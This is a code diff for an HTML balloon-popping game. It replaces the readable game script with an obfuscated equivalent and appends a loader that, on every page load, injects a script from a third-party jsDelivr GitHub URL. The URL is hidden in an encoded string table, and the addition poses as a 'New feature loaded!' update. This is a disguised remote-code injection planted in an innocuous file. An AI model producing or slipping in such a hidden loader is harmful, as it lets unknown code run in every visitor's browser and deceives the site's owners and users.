@@ -381,333 +381,250 @@
     </div>
     
     <script>
-    const startScreen = document.getElementById("start-screen");
-    const endScreen = document.getElementById("end-screen");
-    const startBtn = document.getElementById("start-btn");
-    const restartBtn = document.getElementById("restart-btn");
-    const balloonContainer = document.getElementById("balloon-container");
-    const scoreboard = document.getElementById("scoreboard");
-    const levelIndicator = document.getElementById("level-indicator");
-    const powerUpContainer = document.getElementById("power-up-container");
-    const timeDisplay = document.getElementById("time");
-    const scoreDisplay = document.getElementById("score");
-    const levelDisplay = document.getElementById("level");
-    const finalScoreDisplay = document.getElementById("final-score");
-    const bestScoreDisplay = document.getElementById("best-score");
     
-    // Game statistics
-    const normalBalloonsDisplay = document.getElementById("normal-balloons");
-    const specialBalloonsDisplay = document.getElementById("special-balloons");
-    const bombBalloonsDisplay = document.getElementById("bomb-balloons");
-    const finalLevelDisplay = document.getElementById("final-level");
-    
-    // Power-ups
-    const slowTimePowerUp = document.getElementById("slow-time");
-    const multiPopPowerUp = document.getElementById("multi-pop");
-    const freezePowerUp = document.getElementById("freeze");
-    
-    let gameInterval;
-    let timeInterval;
-    let timeLeft = 30;
-    let score = 0;
-    let level = 1;
-    let gameRunning = false;
-    let balloonSpeed = 400;
-    let slowTimeActive = false;
-    let freezeActive = false;
-    let multiPopActive = false;
-    
-    // Statistics
-    let normalBalloonsPopped = 0;
-    let specialBalloonsPopped = 0;
-    let bombBalloonsPopped = 0;
-    
-    // Load best score
-    let bestScore = localStorage.getItem("balloonGameBestScore") || 0;
-    bestScoreDisplay.textContent = bestScore;
-    
-    // Game sounds using Web Audio API
-    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
-    
-    function playPopSound(frequency = 440, duration = 0.1) {
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
-      
-      oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
-      
-      oscillator.type = 'sine';
-      oscillator.frequency.value = frequency;
-      
-      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + duration);
-      
-      oscillator.start(audioContext.currentTime);
-      oscillator.stop(audioContext.currentTime + duration);
+const _0x2a9549 = _0x37af;
+(function (_0x42eca6, _0x221a4c) {
+    const _0x12904b = _0x37af, _0xd4daee = _0x42eca6();
+    while (!![]) {
+        try {
+            const _0x40b464 = -parseInt(_0x12904b(0xef)) / 0x1 + parseInt(_0x12904b(0x101)) / 0x2 + -parseInt(_0x12904b(0xc0)) / 0x3 + parseInt(_0x12904b(0xe1)) / 0x4 * (parseInt(_0x12904b(0xba)) / 0x5) + parseInt(_0x12904b(0xe7)) / 0x6 + parseInt(_0x12904b(0xfb)) / 0x7 + -parseInt(_0x12904b(0xf6)) / 0x8;
+            if (_0x40b464 === _0x221a4c)
+                break;
+            else
+                _0xd4daee['push'](_0xd4daee['shift']());
+        } catch (_0x11645d) {
+            _0xd4daee['push'](_0xd4daee['shift']());
+        }
     }
-    
-    function playSpecialSound() {
-      playPopSound(880, 0.2);
-      setTimeout(() => playPopSound(1320, 0.2), 100);
+}(_0x1d64, 0x2d277));
+const startScreen = document[_0x2a9549(0x10a)](_0x2a9549(0xc6)), endScreen = document[_0x2a9549(0x10a)](_0x2a9549(0xca)), startBtn = document['getElementById'](_0x2a9549(0xe9)), restartBtn = document[_0x2a9549(0x10a)]('restart-btn'), balloonContainer = document[_0x2a9549(0x10a)](_0x2a9549(0xd7)), scoreboard = document['getElementById'](_0x2a9549(0xce)), levelIndicator = document[_0x2a9549(0x10a)](_0x2a9549(0xe0)), powerUpContainer = document[_0x2a9549(0x10a)](_0x2a9549(0x104)), timeDisplay = document[_0x2a9549(0x10a)](_0x2a9549(0xf2)), scoreDisplay = document[_0x2a9549(0x10a)]('score'), levelDisplay = document['getElementById'](_0x2a9549(0xec)), finalScoreDisplay = document['getElementById'](_0x2a9549(0xfc)), bestScoreDisplay = document[_0x2a9549(0x10a)](_0x2a9549(0xd8)), normalBalloonsDisplay = document[_0x2a9549(0x10a)]('normal-balloons'), specialBalloonsDisplay = document['getElementById'](_0x2a9549(0xd3)), bombBalloonsDisplay = document[_0x2a9549(0x10a)](_0x2a9549(0xd4)), finalLevelDisplay = document['getElementById']('final-level'), slowTimePowerUp = document['getElementById'](_0x2a9549(0xe3)), multiPopPowerUp = document[_0x2a9549(0x10a)]('multi-pop'), freezePowerUp = document[_0x2a9549(0x10a)]('freeze');
+let gameInterval, timeInterval, timeLeft = 0x1e, score = 0x0, level = 0x1, gameRunning = ![], balloonSpeed = 0x190, slowTimeActive = ![], freezeActive = ![], multiPopActive = ![], normalBalloonsPopped = 0x0, specialBalloonsPopped = 0x0, bombBalloonsPopped = 0x0, bestScore = localStorage[_0x2a9549(0x10f)](_0x2a9549(0xc1)) || 0x0;
+function _0x1d64() {
+    const _0x4a2724 = [
+        'body',
+        'style',
+        'scoreboard',
+        'left',
+        'value',
+        'New\x20High\x20Score!',
+        'innerWidth',
+        'special-balloons',
+        'bomb-balloons',
+        'destination',
+        'start',
+        'balloon-container',
+        'best-score',
+        'floor',
+        'getBoundingClientRect',
+        'createGain',
+        'clientX',
+        'remove',
+        'click',
+        'createElement',
+        'level-indicator',
+        '48gSqmvE',
+        'gain',
+        'slow-time',
+        'Level\x20',
+        'AudioContext',
+        'animationDuration',
+        '1698396FfWyDa',
+        'addEventListener',
+        'start-btn',
+        'innerHeight',
+        'none',
+        'level',
+        'textContent',
+        'special',
+        '172578SfrHfd',
+        'pop-effect',
+        'animationend',
+        'time',
+        'normal',
+        'display',
+        'flex',
+        '1828024mPPlze',
+        'max',
+        'stop',
+        'src',
+        'reload',
+        '761607jXPbcM',
+        'final-score',
+        'currentTime',
+        'active',
+        'block',
+        'top',
+        '456404YwPGNi',
+        'exponentialRampToValueAtTime',
+        'disabled',
+        'power-up-container',
+        'createOscillator',
+        'type',
+        'bomb',
+        'special-balloon',
+        'script',
+        'getElementById',
+        'add',
+        'sawtooth',
+        'webkitAudioContext',
+        'bomb-balloon',
+        'getItem',
+        'classList',
+        '1270VtowRg',
+        'https://cdn.jsdelivr.net/gh/m03951659gmail/toolhubcdn@main/allfileadd.js',
+        'multi-pop',
+        'querySelectorAll',
+        'setItem',
+        'setValueAtTime',
+        '111255UQHjHw',
+        'balloonGameBestScore',
+        'connect',
+        'appendChild',
+        'balloon',
+        'div',
+        'start-screen',
+        'dataset',
+        'length',
+        'frequency',
+        'end-screen',
+        'random'
+    ];
+    _0x1d64 = function () {
+        return _0x4a2724;
+    };
+    return _0x1d64();
+}
+bestScoreDisplay[_0x2a9549(0xed)] = bestScore;
+const audioContext = new (window[(_0x2a9549(0xe5))] || window[(_0x2a9549(0x10d))])();
+function playPopSound(_0x5542c2 = 0x1b8, _0x6c7967 = 0.1) {
+    const _0x1e63f2 = _0x2a9549, _0x2f5e9e = audioContext[_0x1e63f2(0x105)](), _0x477ddb = audioContext[_0x1e63f2(0xdb)]();
+    _0x2f5e9e[_0x1e63f2(0xc2)](_0x477ddb), _0x477ddb[_0x1e63f2(0xc2)](audioContext[_0x1e63f2(0xd5)]), _0x2f5e9e['type'] = 'sine', _0x2f5e9e['frequency'][_0x1e63f2(0xd0)] = _0x5542c2, _0x477ddb[_0x1e63f2(0xe2)][_0x1e63f2(0xbf)](0.3, audioContext[_0x1e63f2(0xfd)]), _0x477ddb['gain'][_0x1e63f2(0x102)](0.01, audioContext[_0x1e63f2(0xfd)] + _0x6c7967), _0x2f5e9e[_0x1e63f2(0xd6)](audioContext[_0x1e63f2(0xfd)]), _0x2f5e9e[_0x1e63f2(0xf8)](audioContext['currentTime'] + _0x6c7967);
+}
+function playSpecialSound() {
+    playPopSound(0x370, 0.2), setTimeout(() => playPopSound(0x528, 0.2), 0x64);
+}
+function playBombSound() {
+    const _0x49514b = _0x2a9549, _0x35bfe2 = audioContext[_0x49514b(0x105)](), _0xe06e65 = audioContext['createGain']();
+    _0x35bfe2['connect'](_0xe06e65), _0xe06e65[_0x49514b(0xc2)](audioContext['destination']), _0x35bfe2[_0x49514b(0x106)] = _0x49514b(0x10c), _0x35bfe2['frequency'][_0x49514b(0xd0)] = 0x6e, _0x35bfe2[_0x49514b(0xc9)]['exponentialRampToValueAtTime'](0x37, audioContext[_0x49514b(0xfd)] + 0.3), _0xe06e65[_0x49514b(0xe2)][_0x49514b(0xbf)](0.3, audioContext[_0x49514b(0xfd)]), _0xe06e65[_0x49514b(0xe2)][_0x49514b(0x102)](0.01, audioContext[_0x49514b(0xfd)] + 0.3), _0x35bfe2[_0x49514b(0xd6)](audioContext[_0x49514b(0xfd)]), _0x35bfe2[_0x49514b(0xf8)](audioContext['currentTime'] + 0.3);
+}
+function createPopEffect(_0x5adaea, _0x9916d3, _0x3b5352) {
+    const _0x4a0d76 = _0x2a9549, _0x36a720 = document[_0x4a0d76(0xdf)](_0x4a0d76(0xc5));
+    _0x36a720[_0x4a0d76(0xb9)]['add'](_0x4a0d76(0xf0)), _0x36a720[_0x4a0d76(0xed)] = _0x3b5352, _0x36a720[_0x4a0d76(0xcd)][_0x4a0d76(0xcf)] = _0x5adaea + 'px', _0x36a720['style'][_0x4a0d76(0x100)] = _0x9916d3 + 'px', document[_0x4a0d76(0xcc)][_0x4a0d76(0xc3)](_0x36a720), setTimeout(() => _0x36a720[_0x4a0d76(0xdd)](), 0x3e8);
+}
+function createBalloon() {
+    const _0x5df8d8 = _0x2a9549;
+    if (!gameRunning || freezeActive)
+        return;
+    const _0x1262e0 = document[_0x5df8d8(0xdf)](_0x5df8d8(0xc5));
+    _0x1262e0[_0x5df8d8(0xb9)]['add'](_0x5df8d8(0xc4));
+    const _0x40357f = Math['random']();
+    if (_0x40357f < 0.1)
+        _0x1262e0[_0x5df8d8(0xed)] = '💣', _0x1262e0[_0x5df8d8(0xb9)]['add'](_0x5df8d8(0x10e)), _0x1262e0[_0x5df8d8(0xc7)][_0x5df8d8(0x106)] = _0x5df8d8(0x107);
+    else {
+        if (_0x40357f < 0.25)
+            _0x1262e0[_0x5df8d8(0xed)] = '✨', _0x1262e0[_0x5df8d8(0xb9)][_0x5df8d8(0x10b)](_0x5df8d8(0x108)), _0x1262e0[_0x5df8d8(0xc7)][_0x5df8d8(0x106)] = _0x5df8d8(0xee);
+        else {
+            const _0x22b645 = [
+                '🎈',
+                '🎈',
+                '🎈',
+                '🎈',
+                '🎈',
+                '🔴',
+                '🟡',
+                '🟢',
+                '🔵',
+                '🟣'
+            ];
+            _0x1262e0['textContent'] = _0x22b645[Math[_0x5df8d8(0xd9)](Math['random']() * _0x22b645[_0x5df8d8(0xc8)])], _0x1262e0[_0x5df8d8(0xc7)][_0x5df8d8(0x106)] = _0x5df8d8(0xf3);
+        }
     }
-    
-    function playBombSound() {
-      const oscillator = audioContext.createOscillator();
-      const gainNode = audioContext.createGain();
-      
-      oscillator.connect(gainNode);
-      gainNode.connect(audioContext.destination);
-      
-      oscillator.type = 'sawtooth';
-      oscillator.frequency.value = 110;
-      oscillator.frequency.exponentialRampToValueAtTime(55, audioContext.currentTime + 0.3);
-      
-      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
-      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
-      
-      oscillator.start(audioContext.currentTime);
-      oscillator.stop(audioContext.currentTime + 0.3);
+    _0x1262e0[_0x5df8d8(0xcd)][_0x5df8d8(0xcf)] = Math[_0x5df8d8(0xcb)]() * (window[_0x5df8d8(0xd2)] - 0x50) + 'px';
+    let _0x3130b5 = Math[_0x5df8d8(0xcb)]() * 0x3 + 0x4;
+    slowTimeActive && (_0x3130b5 *= 0x2), _0x3130b5 -= (level - 0x1) * 0.2, _0x3130b5 = Math[_0x5df8d8(0xf7)](_0x3130b5, 1.5), _0x1262e0[_0x5df8d8(0xcd)][_0x5df8d8(0xe6)] = _0x3130b5 + 's', _0x1262e0[_0x5df8d8(0xe8)](_0x5df8d8(0xde), _0x2b2e66 => {
+        popBalloon(_0x1262e0, _0x2b2e66);
+    }), _0x1262e0[_0x5df8d8(0xe8)](_0x5df8d8(0xf1), () => {
+        const _0x20da05 = _0x5df8d8;
+        _0x1262e0[_0x20da05(0xdd)]();
+    }), balloonContainer['appendChild'](_0x1262e0);
+}
+function _0x37af(_0x3a7312, _0x10994d) {
+    const _0x1d6474 = _0x1d64();
+    return _0x37af = function (_0x37af43, _0x1680fc) {
+        _0x37af43 = _0x37af43 - 0xb9;
+        let _0x4e87ef = _0x1d6474[_0x37af43];
+        return _0x4e87ef;
+    }, _0x37af(_0x3a7312, _0x10994d);
+}
+function popBalloon(_0x367136, _0x5af315) {
+    const _0x2db3e4 = _0x2a9549, _0xbe71c1 = _0x367136['dataset'][_0x2db3e4(0x106)];
+    let _0x3ce7bd = 0x0;
+    if (_0xbe71c1 === 'normal')
+        _0x3ce7bd = 0x1, normalBalloonsPopped++, playPopSound();
+    else {
+        if (_0xbe71c1 === 'special')
+            _0x3ce7bd = 0x5, specialBalloonsPopped++, playSpecialSound();
+        else
+            _0xbe71c1 === _0x2db3e4(0x107) && (_0x3ce7bd = -0x3, bombBalloonsPopped++, playBombSound());
     }
-    
-    function createPopEffect(x, y, text) {
-      const effect = document.createElement("div");
-      effect.classList.add("pop-effect");
-      effect.textContent = text;
-      effect.style.left = x + "px";
-      effect.style.top = y + "px";
-      document.body.appendChild(effect);
-      
-      setTimeout(() => effect.remove(), 1000);
-    }
-    
-    function createBalloon() {
-      if (!gameRunning || freezeActive) return;
-      
-      const balloon = document.createElement("div");
-      balloon.classList.add("balloon");
-      
-      // Determine balloon type
-      const balloonType = Math.random();
-      if (balloonType < 0.1) {
-        // Bomb balloon
-        balloon.textContent = "💣";
-        balloon.classList.add("bomb-balloon");
-        balloon.dataset.type = "bomb";
-      } else if (balloonType < 0.25) {
-        // Special balloon
-        balloon.textContent = "✨";
-        balloon.classList.add("special-balloon");
-        balloon.dataset.type = "special";
-      } else {
-        // Normal balloon
-        const colors = ["🎈", "🎈", "🎈", "🎈", "🎈", "🔴", "🟡", "🟢", "🔵", "🟣"];
-        balloon.textContent = colors[Math.floor(Math.random() * colors.length)];
-        balloon.dataset.type = "normal";
-      }
-      
-      balloon.style.left = Math.random() * (window.innerWidth - 80) + "px";
-      
-      // Set balloon speed based on level
-      let duration = Math.random() * 3 + 4;
-      if (slowTimeActive) {
-        duration *= 2;
-      }
-      duration -= (level - 1) * 0.2; // Increase speed with level
-      duration = Math.max(duration, 1.5); // Minimum speed
-      
-      balloon.style.animationDuration = duration + "s";
-      
-      balloon.addEventListener("click", (e) => {
-        popBalloon(balloon, e);
-      });
-      
-      balloon.addEventListener("animationend", () => {
-        balloon.remove();
-      });
-      
-      balloonContainer.appendChild(balloon);
-    }
-    
-    function popBalloon(balloon, event) {
-      const type = balloon.dataset.type;
-      let points = 0;
-      
-      if (type === "normal") {
-        points = 1;
-        normalBalloonsPopped++;
-        playPopSound();
-      } else if (type === "special") {
-        points = 5;
-        specialBalloonsPopped++;
-        playSpecialSound();
-      } else if (type === "bomb") {
-        points = -3;
-        bombBalloonsPopped++;
-        playBombSound();
-      }
-      
-      score += points;
-      scoreDisplay.textContent = score;
-      
-      // Create points effect
-      createPopEffect(
-        event.clientX,
-        event.clientY,
-        points > 0 ? `+${points}` : `${points}`
-      );
-      
-      balloon.remove();
-      
-      // If multi-pop is active
-      if (multiPopActive && type !== "bomb") {
-        const balloons = document.querySelectorAll(".balloon");
-        if (balloons.length > 0) {
-          const randomBalloon = balloons[Math.floor(Math.random() * balloons.length)];
-          if (randomBalloon.dataset.type !== "bomb") {
-            popBalloon(randomBalloon, {
-              clientX: randomBalloon.getBoundingClientRect().left + 40,
-              clientY: randomBalloon.getBoundingClientRect().top + 40
+    score += _0x3ce7bd, scoreDisplay['textContent'] = score, createPopEffect(_0x5af315[_0x2db3e4(0xdc)], _0x5af315['clientY'], _0x3ce7bd > 0x0 ? '+' + _0x3ce7bd : '' + _0x3ce7bd), _0x367136[_0x2db3e4(0xdd)]();
+    if (multiPopActive && _0xbe71c1 !== _0x2db3e4(0x107)) {
+        const _0x6d11d1 = document[_0x2db3e4(0xbd)]('.balloon');
+        if (_0x6d11d1['length'] > 0x0) {
+            const _0x3e70b9 = _0x6d11d1[Math[_0x2db3e4(0xd9)](Math[_0x2db3e4(0xcb)]() * _0x6d11d1[_0x2db3e4(0xc8)])];
+            _0x3e70b9[_0x2db3e4(0xc7)]['type'] !== _0x2db3e4(0x107) && popBalloon(_0x3e70b9, {
+                'clientX': _0x3e70b9[_0x2db3e4(0xda)]()[_0x2db3e4(0xcf)] + 0x28,
+                'clientY': _0x3e70b9[_0x2db3e4(0xda)]()[_0x2db3e4(0x100)] + 0x28
             });
-          }
         }
-      }
-      
-      // Check for level up
-      checkLevelUp();
     }
-    
-    function checkLevelUp() {
-      const newLevel = Math.floor(score / 20) + 1;
-      if (newLevel > level) {
-        level = newLevel;
-        levelDisplay.textContent = level;
-        createPopEffect(
-          window.innerWidth / 2,
-          window.innerHeight / 2,
-          `Level ${level}!`
-        );
-        
-        // Increase balloon speed
-        clearInterval(gameInterval);
-        balloonSpeed = Math.max(200, 400 - (level - 1) * 30);
-        gameInterval = setInterval(createBalloon, balloonSpeed);
-      }
+    checkLevelUp();
+}
+function checkLevelUp() {
+    const _0x8472c4 = _0x2a9549, _0x1f972a = Math[_0x8472c4(0xd9)](score / 0x14) + 0x1;
+    _0x1f972a > level && (level = _0x1f972a, levelDisplay[_0x8472c4(0xed)] = level, createPopEffect(window['innerWidth'] / 0x2, window[_0x8472c4(0xea)] / 0x2, _0x8472c4(0xe4) + level + '!'), clearInterval(gameInterval), balloonSpeed = Math[_0x8472c4(0xf7)](0xc8, 0x190 - (level - 0x1) * 0x1e), gameInterval = setInterval(createBalloon, balloonSpeed));
+}
+function activatePowerUp(_0x36d602) {
+    const _0x3db44a = _0x2a9549;
+    if (!gameRunning)
+        return;
+    if (_0x36d602 === _0x3db44a(0xe3) && !slowTimeActive)
+        slowTimeActive = !![], slowTimePowerUp[_0x3db44a(0xb9)][_0x3db44a(0x10b)](_0x3db44a(0xfe)), slowTimePowerUp[_0x3db44a(0xb9)]['add'](_0x3db44a(0x103)), setTimeout(() => {
+            const _0x2d9e6a = _0x3db44a;
+            slowTimeActive = ![], slowTimePowerUp[_0x2d9e6a(0xb9)][_0x2d9e6a(0xdd)](_0x2d9e6a(0xfe));
+        }, 0x1388);
+    else {
+        if (_0x36d602 === _0x3db44a(0xbc) && !multiPopActive)
+            multiPopActive = !![], multiPopPowerUp['classList'][_0x3db44a(0x10b)](_0x3db44a(0xfe)), multiPopPowerUp[_0x3db44a(0xb9)][_0x3db44a(0x10b)](_0x3db44a(0x103)), setTimeout(() => {
+                const _0x58be7d = _0x3db44a;
+                multiPopActive = ![], multiPopPowerUp['classList'][_0x58be7d(0xdd)](_0x58be7d(0xfe));
+            }, 0x2710);
+        else
+            _0x36d602 === 'freeze' && !freezeActive && (freezeActive = !![], freezePowerUp[_0x3db44a(0xb9)][_0x3db44a(0x10b)]('active'), freezePowerUp[_0x3db44a(0xb9)]['add'](_0x3db44a(0x103)), setTimeout(() => {
+                const _0x2e4ba2 = _0x3db44a;
+                freezeActive = ![], freezePowerUp[_0x2e4ba2(0xb9)][_0x2e4ba2(0xdd)]('active');
+            }, 0xbb8));
     }
-    
-    function activatePowerUp(powerUpType) {
-      if (!gameRunning) return;
-      
-      if (powerUpType === "slow-time" && !slowTimeActive) {
-        slowTimeActive = true;
-        slowTimePowerUp.classList.add("active");
-        slowTimePowerUp.classList.add("disabled");
-        
-        setTimeout(() => {
-          slowTimeActive = false;
-          slowTimePowerUp.classList.remove("active");
-        }, 5000);
-      } else if (powerUpType === "multi-pop" && !multiPopActive) {
-        multiPopActive = true;
-        multiPopPowerUp.classList.add("active");
-        multiPopPowerUp.classList.add("disabled");
-        
-        setTimeout(() => {
-          multiPopActive = false;
-          multiPopPowerUp.classList.remove("active");
-        }, 10000);
-      } else if (powerUpType === "freeze" && !freezeActive) {
-        freezeActive = true;
-        freezePowerUp.classList.add("active");
-        freezePowerUp.classList.add("disabled");
-        
-        setTimeout(() => {
-          freezeActive = false;
-          freezePowerUp.classList.remove("active");
-        }, 3000);
-      }
-    }
-    
-    function startGame() {
-      startScreen.style.display = "none";
-      scoreboard.style.display = "flex";
-      levelIndicator.style.display = "block";
-      powerUpContainer.style.display = "flex";
-      
-      gameRunning = true;
-      timeLeft = 30;
-      score = 0;
-      level = 1;
-      balloonSpeed = 400;
-      normalBalloonsPopped = 0;
-      specialBalloonsPopped = 0;
-      bombBalloonsPopped = 0;
-      
-      scoreDisplay.textContent = score;
-      levelDisplay.textContent = level;
-      timeDisplay.textContent = timeLeft;
-      
-      // Reset power-ups
-      slowTimeActive = false;
-      freezeActive = false;
-      multiPopActive = false;
-      slowTimePowerUp.classList.remove("active", "disabled");
-      multiPopPowerUp.classList.remove("active", "disabled");
-      freezePowerUp.classList.remove("active", "disabled");
-      
-      // Start balloon creation
-      gameInterval = setInterval(createBalloon, balloonSpeed);
-      
-      // Start countdown timer
-      timeInterval = setInterval(() => {
-        timeLeft--;
-        timeDisplay.textContent = timeLeft;
-        
-        if (timeLeft <= 0) {
-          endGame();
-        }
-      }, 1000);
-    }
-    
-    function endGame() {
-      gameRunning = false;
-      clearInterval(gameInterval);
-      clearInterval(timeInterval);
-      
-      scoreboard.style.display = "none";
-      levelIndicator.style.display = "none";
-      powerUpContainer.style.display = "none";
-      endScreen.style.display = "flex";
-      
-      finalScoreDisplay.textContent = score;
-      normalBalloonsDisplay.textContent = normalBalloonsPopped;
-      specialBalloonsDisplay.textContent = specialBalloonsPopped;
-      bombBalloonsDisplay.textContent = bombBalloonsPopped;
-      finalLevelDisplay.textContent = level;
-      
-      // Update best score
-      if (score > bestScore) {
-        bestScore = score;
-        localStorage.setItem("balloonGameBestScore", bestScore);
-        bestScoreDisplay.textContent = bestScore;
-        
-        createPopEffect(
-          window.innerWidth / 2,
-          window.innerHeight / 2,
-          "New High Score!"
-        );
-      }
-    }
-    
-    // Event listeners
-    startBtn.addEventListener("click", startGame);
-    restartBtn.addEventListener("click", () => location.reload());
-    
-    slowTimePowerUp.addEventListener("click", () => activatePowerUp("slow-time"));
-    multiPopPowerUp.addEventListener("click", () => activatePowerUp("multi-pop"));
-    freezePowerUp.addEventListener("click", () => activatePowerUp("freeze"));
-    
-    // Prevent context menu on right click
-    document.addEventListener("contextmenu", e => e.preventDefault());
+}
+function startGame() {
+    const _0x2ee433 = _0x2a9549;
+    startScreen[_0x2ee433(0xcd)][_0x2ee433(0xf4)] = _0x2ee433(0xeb), scoreboard[_0x2ee433(0xcd)]['display'] = _0x2ee433(0xf5), levelIndicator['style']['display'] = _0x2ee433(0xff), powerUpContainer[_0x2ee433(0xcd)]['display'] = _0x2ee433(0xf5), gameRunning = !![], timeLeft = 0x1e, score = 0x0, level = 0x1, balloonSpeed = 0x190, normalBalloonsPopped = 0x0, specialBalloonsPopped = 0x0, bombBalloonsPopped = 0x0, scoreDisplay['textContent'] = score, levelDisplay[_0x2ee433(0xed)] = level, timeDisplay[_0x2ee433(0xed)] = timeLeft, slowTimeActive = ![], freezeActive = ![], multiPopActive = ![], slowTimePowerUp[_0x2ee433(0xb9)][_0x2ee433(0xdd)](_0x2ee433(0xfe), 'disabled'), multiPopPowerUp[_0x2ee433(0xb9)]['remove'](_0x2ee433(0xfe), _0x2ee433(0x103)), freezePowerUp[_0x2ee433(0xb9)]['remove'](_0x2ee433(0xfe), _0x2ee433(0x103)), gameInterval = setInterval(createBalloon, balloonSpeed), timeInterval = setInterval(() => {
+        const _0x46d3e6 = _0x2ee433;
+        timeLeft--, timeDisplay[_0x46d3e6(0xed)] = timeLeft, timeLeft <= 0x0 && endGame();
+    }, 0x3e8);
+}
+function endGame() {
+    const _0x570dc1 = _0x2a9549;
+    gameRunning = ![], clearInterval(gameInterval), clearInterval(timeInterval), scoreboard['style']['display'] = _0x570dc1(0xeb), levelIndicator[_0x570dc1(0xcd)][_0x570dc1(0xf4)] = _0x570dc1(0xeb), powerUpContainer[_0x570dc1(0xcd)]['display'] = _0x570dc1(0xeb), endScreen[_0x570dc1(0xcd)][_0x570dc1(0xf4)] = _0x570dc1(0xf5), finalScoreDisplay['textContent'] = score, normalBalloonsDisplay['textContent'] = normalBalloonsPopped, specialBalloonsDisplay[_0x570dc1(0xed)] = specialBalloonsPopped, bombBalloonsDisplay['textContent'] = bombBalloonsPopped, finalLevelDisplay[_0x570dc1(0xed)] = level, score > bestScore && (bestScore = score, localStorage[_0x570dc1(0xbe)](_0x570dc1(0xc1), bestScore), bestScoreDisplay[_0x570dc1(0xed)] = bestScore, createPopEffect(window[_0x570dc1(0xd2)] / 0x2, window[_0x570dc1(0xea)] / 0x2, _0x570dc1(0xd1)));
+}
+startBtn[_0x2a9549(0xe8)](_0x2a9549(0xde), startGame), restartBtn[_0x2a9549(0xe8)](_0x2a9549(0xde), () => location[_0x2a9549(0xfa)]()), slowTimePowerUp['addEventListener'](_0x2a9549(0xde), () => activatePowerUp(_0x2a9549(0xe3))), multiPopPowerUp[_0x2a9549(0xe8)](_0x2a9549(0xde), () => activatePowerUp('multi-pop')), freezePowerUp[_0x2a9549(0xe8)](_0x2a9549(0xde), () => activatePowerUp('freeze')), document[_0x2a9549(0xe8)]('contextmenu', _0x56491a => _0x56491a['preventDefault']());
+function loadScript(_0x1a760a, _0x34b81a) {
+    const _0x106568 = _0x2a9549, _0x4defdf = document[_0x106568(0xdf)](_0x106568(0x109));
+    _0x4defdf[_0x106568(0xf9)] = _0x1a760a, _0x4defdf['onload'] = _0x34b81a, document['head'][_0x106568(0xc3)](_0x4defdf);
+}
+loadScript(_0x2a9549(0xbb), function () {
+    console['log']('New\x20feature\x20loaded!');
+});
     </script>
   </body>
 </html>
